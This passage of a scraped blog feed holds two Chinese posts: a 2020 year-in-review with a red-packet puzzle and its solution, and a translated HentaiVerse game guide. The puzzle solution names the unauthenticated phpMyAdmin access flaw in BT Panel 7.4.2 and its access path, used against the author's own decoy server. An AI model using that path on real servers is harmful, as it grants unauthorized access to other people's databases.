还剩下最后两天，是时候总结一下这一年了。</p>\n<h1>统计数据</h1>\n<p>依然是一些统计数据。以下数据截止 2020 年 12 月 29 日 23:39:59。</p>\n<h2>博客主站</h2>\n<p>无垠博客主站，年 UV 28,888 (<span>+7.4%</span>)，年 PV 76,583 (<span>-1.66%</span>)，日均 UV 79.36，平均停留时间 5分13秒 (<span>-21.4%</span>)，平均跳出率 51% (<span>-3.77%</span>)。一年有效文章数 5 (<span>+150%</span>)，新增评论 242 条 (<span>-44.9%</span>)。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/blog-2020.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/blog-2020.png\" alt=\"\" width=\"515\" height=\"670\" class=\"aligncenter size-full wp-image-2432\"></a>\n<p>文章数提升，访问量也有所提升，但 PV 和停留时间却下降了，或许我还需要继续提高文章的质量…</p>\n<h2>个人主页</h2>\n<p>个人主页依然是几乎没有更新过。什么时候能把 TODO List 上的东西做了呢？我也不知道。不过访问量倒是比去年上升了不少。</p>\n<p>个人页总 UV 3,515 (<span>+64.2%</span>)，总 PV 3,929 (<span>+43.2%</span>)，日均 UV 9.9 (<span>+65%</span>)，平均停留时间 63秒 (<span>+1.6%</span>)。和去年一样，主要来源是知乎和 V2EX。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/axton-2020.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/axton-2020.png\" alt=\"\" width=\"515\" height=\"670\" class=\"aligncenter size-full wp-image-2433\"></a>\n<h2>MDx</h2>\n<p>一年中，MDx 更新了 7 次，新增 328 commits (<span>+91.8%</span>)，Star 数增加了 306，现有 614。感谢所有人的支持。当然，虽然 2.0 咕咕咕了很久（甚至离最早的承诺已经过去将近一年半了），但我已经在对 2.0 进行最后的完善（改动确实比较大）。相信在 2021 的开头，MDx 2.0 就能顺利发布了。</p>\n<div class=\"mdx-github-cot\" data-mdxgithuba=\"yrccondor\" data-mdxgithubp=\"mdx\" data-mdxgithubg=\"https://api.github.com/\"><div class=\"mdx-github-wait-out-c2\"><div class=\"mdx-github-wait-out-c mdui-valign\"><div class=\"mdx-github-wait-out\"><div class=\"mdx-github-wait\"><a href=\"https://github.com/yrccondor/mdx\"><div class=\"mdui-spinner\"></div></a></div></div></div></div></div>\n<h1>大事记</h1>\n<ul>\n<li>一月：我经历过的最长的“寒假”开始了</li>\n<li>二月：GitHub followers 换虚拟币，成功换到 3.5k CNY 没有翻车</li>\n<li>三月：<a href=\"https://flyhigher.top/develop/2160.html\">WP-WebAuthn</a> 插件成功上线 <a href=\"https://wordpress.org/plugins/wp-webauthn/\">WordPress 插件目录</a>\n</li>\n<li>四月：Cytus II 主线大结局<del>，我当场通关 </del>\n</li>\n<li>五月：开始学车</li>\n<li>五月：MDx 达到 500 Stars</li>\n<li>七月：第一次实习，公司的前端技术栈和我熟悉的完全一致<del>，于是愉快地在公司里写了一个半月的各种表格 </del>\n</li>\n<li>八月：实习结束，部门同事都很棒，确实学到了很多</li>\n<li>九月：和 Ralph 面基一整天</li>\n<li>九月：入手树莓派 4B</li>\n<li>十月：搬家</li>\n<li>十月：和宁诺合作的 H5 上线</li>\n<li>十一月：TEDxNingbo 年度大会，H5 上线<del>，持续摸鱼中 </del>\n</li>\n<li>十一月：终于买了块副屏，<del> 秃头 </del>写代码更快乐了</li>\n<li>十二月：MDx 喜提 600 Stars</li>\n</ul>\n<h1>跨年红包</h1>\n<p><del>传统艺能时间！和以前一样，红包不是白拿的，你需要一点点技术力来解密拿到红包。有效期截至 2021 年 1 月 1 日 22 时。</del></p>\n<p>今年的解谜旅程，从下面这段颜文字开始。</p>\n<pre>ﾟωﾟﾉ= /｀ｍ´）ﾉ ~┻━┻   //*´∇｀*/ ['_']; o=(ﾟｰﾟ)  =_=3; c=(ﾟΘﾟ) =(ﾟｰﾟ)-(ﾟｰﾟ); (ﾟДﾟ) =(ﾟΘﾟ)= (o^_^o)/ (o^_^o);(ﾟДﾟ)={ﾟΘﾟ: '_' ,ﾟωﾟﾉ : ((ﾟωﾟﾉ==3) +'_') [ﾟΘﾟ] ,ﾟｰﾟﾉ :(ﾟωﾟﾉ+ '_')[o^_^o -(ﾟΘﾟ)] ,ﾟДﾟﾉ:((ﾟｰﾟ==3) +'_')[ﾟｰﾟ] }; (ﾟДﾟ) [ﾟΘﾟ] =((ﾟωﾟﾉ==3) +'_') [c^_^o];(ﾟДﾟ) ['c'] = ((ﾟДﾟ)+'_') [ (ﾟｰﾟ)+(ﾟｰﾟ)-(ﾟΘﾟ) ];(ﾟДﾟ) ['o'] = ((ﾟДﾟ)+'_') [ﾟΘﾟ];(ﾟoﾟ)=(ﾟДﾟ) ['c']+(ﾟДﾟ) ['o']+(ﾟωﾟﾉ +'_')[ﾟΘﾟ]+ ((ﾟωﾟﾉ==3) +'_') [ﾟｰﾟ] + ((ﾟДﾟ) +'_') [(ﾟｰﾟ)+(ﾟｰﾟ)]+ ((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+((ﾟｰﾟ==3) +'_') [(ﾟｰﾟ) - (ﾟΘﾟ)]+(ﾟДﾟ) ['c']+((ﾟДﾟ)+'_') [(ﾟｰﾟ)+(ﾟｰﾟ)]+ (ﾟДﾟ) ['o']+((ﾟｰﾟ==3) +'_') [ﾟΘﾟ];(ﾟДﾟ) ['_'] =(o^_^o) [ﾟoﾟ] [ﾟoﾟ];(ﾟεﾟ)=((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+ (ﾟДﾟ) .ﾟДﾟﾉ+((ﾟДﾟ)+'_') [(ﾟｰﾟ) + (ﾟｰﾟ)]+((ﾟｰﾟ==3) +'_') [o^_^o -ﾟΘﾟ]+((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+ (ﾟωﾟﾉ +'_') [ﾟΘﾟ]; (ﾟｰﾟ)+=(ﾟΘﾟ); (ﾟДﾟ)[ﾟεﾟ]='\\\\'; (ﾟДﾟ).ﾟΘﾟﾉ=(ﾟДﾟ+ ﾟｰﾟ)[o^_^o -(ﾟΘﾟ)];(oﾟｰﾟo)=(ﾟωﾟﾉ +'_')[c^_^o];(ﾟДﾟ) [ﾟoﾟ]='\\\"';(ﾟДﾟ) ['_'] ( (ﾟДﾟ) ['_'] (ﾟεﾟ+(ﾟДﾟ)[ﾟoﾟ]+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟoﾟ]) (ﾟΘﾟ)) ('_')</pre>\n<p><del>和去年一样，红包限时不限量。</del>为了保持解谜乐趣，请不要将答案透露给他人，也请不要重复领取红包，否则视情况活动可能会提前结束。</p>\n<p>由于出现大量重复领取/未解题即领取红包的现象，红包解谜活动立即结束，当前红包领完后将不再更新新的红包口令码。<strong>我发起红包解谜活动是为了解题的乐趣而不是发钱，请各位理解。</strong>以下是详细信息。</p>\n<p>出于对参与者的信任，今年的题目中没有对参与者是否已完成前序步骤进行任何验证，但在最后的 WebSocket 中我记录下了所有成功连接的 IP。今年共发出了 32 个红包，但最后一个步骤的日志只记录到了 25 个不重复 IP（鉴于第一批 10 个红包领完时只记录到了四个 IP，实际人数应该小于 25）。查阅支付宝的红包领取记录可以发现有多位用户多次领取了红包，还有一些用户疑似是从他人处获取答案并直接领取的。鉴于活动已经完全失去意义，我选择提前结束了红包解谜活动。</p>\n<h2>红包答案</h2>\n<p>现在，让我们来看看答案吧。今年的题目难度不高，由于事情比较多，我的准备时间确实不多。</p>\n<p>第一阶段非常简单，这段颜文字就是 Javascript，只是使用了著名的 aaencode 将其编码为了颜文字<del>（多亏了 js 优秀的自动类型转换）</del>。将这段颜文字扔进浏览器控制台即可得到 <code>https://rp.dlij.site/2021/</code>。</p>\n<p>前往这个 URL，可以看到这张图。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/index.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/index.png\" alt=\"\" width=\"2000\" height=\"1125\" class=\"aligncenter size-full wp-image-2444\"></a>\n<p>今年八月宝塔面板 7.4.2 的 phpMyAdmin 未授权访问漏洞很多人都知道了，如果你不清楚，搜索“宝塔面板 7.4.2”也能找到相关信息。首先找到 <code>rp.dlij.site</code> 对应的 IP 是 <code>121.196.27.125</code>，访问 <code>http://121.196.27.125:888/pma</code> 即可看到一个 phpMyAdmin 的界面（为了把这个页面扒下来我还装了一个真的宝塔面板…）。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/pma.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/pma.jpg\" alt=\"\" width=\"1600\" height=\"867\" class=\"aligncenter size-full wp-image-2448\"></a>\n<p>可以看到信息是 <code>7972632E6D652F6738546D444A3132</code>。和前年一样，这其实是十六进制的 ASCII 码，每两位转为 ASCII 字符即可得到 <code>yrc.me/g8TmDJ12</code>。访问这个页面，可以看到如下信息。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/apl.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/apl.jpg\" alt=\"\" width=\"1500\" height=\"248\" class=\"aligncenter size-full wp-image-2447\"></a>\n<p>这是 APL，一种有趣的函数式编程语言。你可能不了解它，但只要你搜索网页的 <code>title</code>，就能找到这个在线运行 APL 的页面：<a href=\"https://tryapl.org/\">TryAPL</a>。在这个页面中粘贴这段代码，即可得到 <code>https://rp.dlij.site/2021/2554038.75</code>。访问这个 URL，可以看到一张图。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/2021-b.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/2021-b.jpg\" alt=\"\" width=\"720\" height=\"960\" class=\"aligncenter size-full wp-image-2445\"></a>\n<p>连续三年的传统艺能了，压缩包藏在了图片里。下载图片，将后缀改为 .zip 然后打开，可以看到一个 README.md。其中要求我们去 <code>ws://121.196.27.125:8080/NvAhoZ9@H2Au</code> 获取最终红包口令码。这是一个 WebSocket 协议的地址，在浏览器中开一个新 Console，执行 <code>new WebSocket('ws://121.196.27.125:8080/NvAhoZ9@H2Au')</code> 即可在 Network 选项卡中看见服务器下发的红包口令码。当然，别忘了将其反转。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/message.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/message.jpg\" alt=\"\" width=\"475\" height=\"179\" class=\"aligncenter size-full wp-image-2446\"></a>\n<h1>跨年海报</h1>\n<p>依然是传统艺能，今年的海报只用到了 PS。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/2021.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/2021.jpg\" alt=\"2021\" width=\"720\" height=\"960\" class=\"aligncenter size-full wp-image-2407\"></a>\n<p>提前祝各位新年快乐！</p>\n","link":"https://flyhigher.top/diary/2405.html"},{"title":"[译] HentaiVerse 建议和指导","date":"2020-12-24 22:31:00","description":"\n<p>著名的同人本资源集散地 E-hentai 有一个完全没有人在意的角落 ——「HentaiVerse」，一个纯文字网页 RPG 游戏。虽然这个游戏应该不会有太多新玩家了，不过还是翻译一篇给新玩家的指导文吧。</p>\n<span></span><blockquote><p>原文标题：HentaiVerse Advice<br>原文作者：<a href=\"https://ehwiki.org/action/history/Talk:HentaiVerse_Advice\">作者列表</a><br>原文链接：<a href=\"https://ehwiki.org/wiki/HentaiVerse_Advice\">https://ehwiki.org/wiki/HentaiVerse_Advice</a><br>原文授权协议：GNU Free Documentation License 1.2+<br>本文由 <a href=\"https://skk.moe/\">Sukka</a> 翻译，首发于 <a href=\"https://blog.skk.moe/\">Sukka’s Blog</a></p></blockquote>\n<h2>译者的话</h2>\n<ul>\n<li>本文不是 HentaiVerse 新手教程文。想入新手村请左转百度贴吧「HV 网页游戏吧」置顶帖、右转 E-hentai 社区<a href=\"https://forums.e-hentai.org/index.php?showtopic=189266\">「中文指引」帖</a>。</li>\n<li>本文假设你对 HentaiVerse 有一定程度的了解。如果你不满足这个前提，请先去阅读 <a href=\"https://ehwiki.org/\">EHWiki</a>。</li>\n<li>本文的作者都是 E-hentai 社区中受人敬仰的资深玩家、亦或是 E-hentai 社区 HentaiVerse 版块的管理员，但毫无疑问这并非你唯一的玩法选择，译者本人的玩法风格就与本文的建议背道而驰（截至本文译就，译者为 360 级，装备搭配是 西洋 + 超高格挡圆盾 + 全身轻甲）。</li>\n<li>HentaiVerse 带来的收益其实很有限，尤其是当你要解锁 HentaiVerse 相关的 Hath Perks 时。不过如果你是为了赚 Credit 和 GP 才来玩 HentaiVerse 的话，之后你也不会有心思看本子的。</li>\n</ul>\n<h2>路线指导</h2>\n<h3>50 级之前</h3>\n<p>在这个阶段，你完全不必在意选择 <a href=\"https://ehwiki.org/wiki/Play_Styles/Chinese\">战士或法师</a>，也不必在乎 <a href=\"https://ehwiki.org/wiki/Fighting_Styles/Chinese\">战斗风格</a>。保持你的主属性均衡分布（译者注：即中文玩家圈口中的「水桶加点」）。此时游戏的难度和花费都是微不足道的，你可以试一试每一种玩法和风格。</p>\n<h3>51 级到 199 级</h3>\n<p>200 级以前推荐走战士的路线。<a href=\"https://ehwiki.org/wiki/Fighting_Styles#Two-Handed\">双手武器</a> + <a href=\"https://ehwiki.org/wiki/armor\">轻甲</a> 是个不错的选择，使用西洋剑和盾牌的 <a href=\"https://ehwiki.org/wiki/Fighting_Styles#One-Handed\">单手</a> 风格也值得一试。这两种玩法可以提供最佳的生存可能，因此你可以提前尝试更高的 <a href=\"https://ehwiki.org/wiki/difficulties\">难度</a>，而更高的难度意味着更好的掉落。</p>\n<p>不建议这个阶段的玩家尝试法师，因为法师是一种游走在边缘的危险玩法，如果你没有很好的装备和咒语，那么很大几率你在杀死敌人之前会先被敌人干掉。这并不是说你不能选择法师，但是你很难在更高的难度下通关。</p>\n<p>继续维持主属性均衡分布，INT 除外（译者注，一般推荐 INT 值为当前等级的 60% 到 70%，以保证足够的 SP 值用于维持灵动架势）。每 30 级左右就更换一次装备，考虑到你现在用的装备都不推荐魂绑，所以使用和你等级接近的装备显然更合适。</p>\n<h3>200 级到 319 级</h3>\n<p>怪物会因为可以使用灵力攻击而变得更强大。在这个阶段，建议用西洋剑玩单手盾战风格，西洋剑的后缀应该是「杀戮」或「平衡」，盾牌的类型则推荐力场盾、不过最关键的是盾牌的「格挡率」越高越好。这个阶段推荐使用重甲，最好是带有 Power 前缀的。「杀戮」后缀的重甲减伤一般而伤害加成更高，价格也更贵。</p>\n<p>此时仍然不推荐法师风格，因为 310 级以前你没法点满「Faster Imperil」。除非你的装备非常好，否则你必须要大量使用「Imperil」技能，而这个等级下的装备是非常昂贵的。</p>\n<h3>320 级以上</h3>\n<p>法师突然变成一个非常可行的选择。杀戮后缀的西洋剑 + 立场盾 + Power 前缀杀戮后缀重甲 也很不错。法师装备更贵、依赖 Supportive 咒语生存，但是清关的速度更快（译者注：法师清关龙场一般不会超过 2000 turn、但盾战需要至少 8000 turn）。</p>\n<h2>风格指导</h2>\n<h3>法师</h3>\n<ul>\n<li>只使用布甲和法杖</li>\n<li>法师可以施放除「虚空伤害」以外的所有伤害类型的法术</li>\n<li>可以对一片怪物造成伤害</li>\n<li>可以借助元素爆炸的优势</li>\n<li>0 干扰、极低的负重，因此魔法消耗和行动速度很快</li>\n<li>缓伤效果较差</li>\n</ul>\n<h3>战士</h3>\n<p>不论你是哪一种战士，友情小马炮永远是你最好的朋友。</p>\n<h4>轻甲</h4>\n<ul>\n<li>中等水平的缓伤、干扰、负重，低穿刺缓伤、低回避率</li>\n<li>暗影类轻甲可以提供更高的伤害加成，0 干扰，相对更高的回避率，但缓伤较低、完全不能免疫穿刺伤害</li>\n</ul>\n<h4>重甲</h4>\n<ul>\n<li>最高的缓伤效果，但是干扰和负重也最高</li>\n<li>Power 前缀的动力甲可以提供不错的伤害加成</li>\n</ul>\n<h4>单手</h4>\n<ul>\n<li>搭配盾牌可以带来不错的格挡率加成，有效提升生存率</li>\n<li>「压倒性的攻击」技能可以增加伤害、命中率和招架率</li>\n<li>反击可以增加斗气，让你可以频繁地使用「Fighting Skills」和保持住「灵动架势」</li>\n</ul>\n<h4>双持</h4>\n<ul>\n<li>对单个目标的伤害最高，适合浴血擂台（Ring of Blood）和传奇竞技场</li>\n<li>可以打出两个效果（如同时打出「眩晕」和「刺甲」）</li>\n<li>三阶段「Fighting Skills」可以击中多个目标</li>\n<li>由于没有盾牌、格挡率加成极低，只能靠回避率和招架率生存</li>\n<li>攻击速度和命中率极高，但生存率很一般</li>\n</ul>\n<h4>双手</h4>\n<ul>\n<li>「Domino Strike」可以命中多个目标</li>\n<li>易于同时攻击多个目标</li>\n</ul>\n<h4>二天一流</h4>\n<ul>\n<li>搭配日本刀 + 胁差的玩法风格</li>\n<li>同时拥有部分双手和双持的优势</li>\n<li>「Domino Strike」只能命中不超过 5 个目标</li>\n<li>副手没有招架加成</li>\n<li>适合 100 级以下的玩家或 300 级以上的玩家</li>\n</ul>\n<h2>培养方向</h2>\n<h3>技能点</h3>\n<p>这一节的内容适用于所有风格，不论是法师、战士还是战法师。</p>\n<p>不要把技能点浪费在你不主动使用的能力上（比如你是一名元素法师，就不应该加圣、暗的技能），技能只有在装配在支配槽中才会起作用。在低等级时你升级获得的技能点会远比你需要的多，但是到 200 级以后你的技能点就会不够用了。你需要通过 <a href=\"https://ehwiki.org/wiki/training\">训练</a>「Ability Boost」来获得更多的技能点。</p>\n<h4>应该加的技能</h4>\n<ul>\n<li>HP Tank（非常重要）：血条，直接决定你的生存几率</li>\n<li>MP Tank（非常重要）：蓝条，非常有用</li>\n<li>Better Cure（非常重要）：减少冷却时间、增加治疗的 HP 量。在 HentaiVerse 里 HP 药水效果一般，你会更依赖治疗咒语。</li>\n<li>Better Regen（非常重要）：提供更有效且更持久的回血</li>\n<li>Better Protection（非常重要）：极大地提升生存几率</li>\n<li>对应装备和战斗风格的技能（非常重要）：随着熟练度提升将有效提升你的任务属性</li>\n<li>Better Mana Pots（重要）：MP 药水是战斗必带的回复品</li>\n<li>Better Haste（重要）：增加你攻击、施法的速度，因此你可以攻击更多的怪物，有效提升你的生存几率</li>\n<li>Stronger Spirit（重要）：让灵力盾可以消耗更少的 SP、更早的抵御攻击</li>\n<li>SP Tanks（重要）：对于战士来说，这是保持灵动架势必备的。而灵力盾和生命火花也依赖 SP 才能发挥作用</li>\n<li>Better Shadow Veil：更高的回避率加成意味着更高的生存几率</li>\n<li>Better Imperil（可选）：削弱怪物的缓伤，对于法师来说是个不错的选择</li>\n<li>Faster Imperil（可选）：降低 Imperil 的消耗和冷却时间、增加受影响的目标，特别适合法师</li>\n<li>Better Spark（可选）：大部分玩家都会通过 IA 自动施放生命火花，此时只能帮助你减少 MP 消耗。一旦你升到 150 级以上，你就会经常看到带有 SP 条的怪物了，而怪物的 SP 攻击可以对你造成极大的伤害、甚至能秒杀你，而生命火花就是你的最后一道保障（译者注：「生命火花」类似于 Minecraft 的「不死图腾」）</li>\n</ul>\n<h4>不推荐的技能</h4>\n<ul>\n<li>Better Drain：造成的伤害非常有限</li>\n<li>Faster Drain：枯竭咒语本身的施法速度就够快了，而冷却时间却不会变短很多</li>\n<li>Better Absorb：很一般的咒语，大部分怪物并不会进行魔法攻击。只有在打 Boss 时会有点用</li>\n<li>Better Slow：Better MagNet 显然是个更合适的选择</li>\n<li>Mind Control：并没有什么用</li>\n<li>Better Blind 和 Faster Blind：Weaken 咒语效果更明显</li>\n<li>Ether Theft：对法师来说是多余的</li>\n</ul>\n<h3>法师哲学</h3>\n<p>法师是一种游走在边缘的职业，尝试在怪物秒杀你之前 秒杀他们。</p>\n<ul>\n<li>310 级以前不建议尝试</li>\n<li>依赖高伤害和回避率生存</li>\n<li>高投入、高回报</li>\n</ul>\n<h3>战士哲学</h3>\n<ul>\n<li>通过高缓伤和再生咒语生存，使用格挡、回避和招架防御。</li>\n<li>战士也需要 MP 维持 BUFF，必要时还要使用 DEBUFF</li>\n<li>200 级以前，尽量确保命中率高于 100%</li>\n</ul>\n<h2>难度调整</h2>\n<p>随着你的等级不断提升，你将会遇见更强大的怪物，战力大多都在 400 以上（拥有 SP 攻击的能力）。从 150 级开始难度就会显著增加，因此你应该适时做一些难度调整。</p>\n<ul>\n<li>尽量选择 Hard 以上难度，以便获得 Shard</li>\n<li>获得更好的装备（尤其是武器），数值比装备等级更重要</li>\n<li>多多使用 BUFF 和 DEBUFF</li>\n<li>第一个 IA 自动施法槽只需要 50H，非常非常非常非常划算的投资</li>\n</ul>\n<h2>装备</h2>\n<p>等级较低的玩家应该多逛逛 E-hentai 社区，领取免费装备和每周的补给（药水、卷轴等）。品质高的装备的属性不一定比品质低的装备好，因此选择和更换装备时三思而后行。</p>\n<h2>物品</h2>\n<ul>\n<li>药水是拿来喝的，不是拿来收藏的。</li>\n<li>喝药水和使用卷轴不计入 turn，所以为啥不多用用呢？</li>\n<li>长效药一般用于较长的战斗，普通药水用于应急，丹药（译者注：中文圈玩家一般称之为「大药」）是在紧急情况下、普通药水的冷却时间还没过、或想要同时获得两种效果时使用的。一些老玩家会给新玩家发放免费药水，去 E-hentai 社区 HentaiVerse 版块的 WTS 分区里看看？</li>\n<li>浴血擂台中 Flying Spaghetti Monster 是性价比最高的，其余的挑战通一次就够了。</li>\n<li>只有你自信能在 PFUDOR 难度打败 Triple Trio and the Tree 时再去刷。</li>\n</ul>\n<h2>怪物实验室</h2>\n<ul>\n<li>你想什么时候去看看就去，只需要记住怪物给予礼物的间隔至少为一小时，而且较弱的怪物一般很少给予礼物。</li>\n<li>如果一个怪物过去 3 天没有给你礼物的怪物，那么接下来他一定会给予你一个礼物。</li>\n<li>怪物的名字越有趣越好，不要用序号或者脸滚键盘为怪物取名。</li>\n</ul>\n<h2>雪花祭坛和奖杯</h2>\n<ul>\n<li>你可以通过献祭奖杯换取装备，也可以随时将它们卖掉。它们在雪花祭坛的价值不会改变，因此囤积它们没有实际意义。</li>\n<li>奖杯永远不要卖给系统店，要么献祭掉、要么卖给玩家（比系统店的价格要高得多）。</li>\n</ul>\n<h2>训练</h2>\n<p>训练会极大程度的消耗你的 Credits，并且除了 Adept Learner 和 Ability Boost 以外很难给你提供太多加成：将 Scavenger 训练满将会花费你 1700 万 Credit，但是掉落几率不过从 10% 提升到 12.5% 而已（译者注：在中文圈玩家中，四个增加掉落率的训练被称为「四大」，因为「四大皆空」）。</p>\n<h2>武器店和道具店</h2>\n<p>武器店里卖的装备要么等级太高、要么等级太低，不如在 社区 HentaiVerse 版块的 WTS 分区里直接向玩家购买。道具店里的东西一般很贵，WTS 版块里要便宜一些，但是去 <a href=\"https://hvmarket.xyz/\">HVMarket</a> 购买最划算。</p>\n<h2>熔炉</h2>\n<ul>\n<li>每项属性的前 5 次升级都不消耗站粘合剂，性价比高；而当你分解装备时，强化材料的 90% 原料都会返还给你，因此在低等级时升级装备还是相对划算的。</li>\n<li>叠加装备附魔不会增强效果，只会增加持续的时间。</li>\n<li>当你装备获得了不想要的潜能时，马上重新锻造它，因为每一级装备潜能意味着需要一片重铸碎片。</li>\n<li>除非你是土豪，否则不要购买灵魂碎片。每天打遭遇战可以获得至多 60 片灵魂碎片。</li>\n</ul>\n<div class=\"license\">\n<div class=\"license-title\">[译] HentaiVerse 建议和指导</div>\n<div class=\"license-link\"><a href=\"https://blog.skk.moe/post/hentaiverse-advice/\">https://blog.skk.moe/post/hentaiverse-advice/</a></div>\n<div class=\"license-meta\">\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">本文作者</div>\n<div class=\"license-meta-text\">Sukka</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">发布于</div>\n<div class=\"license-meta-text\">2020-12-24</div>\n</div>\n<div class=\"license-meta-item\">\n<div 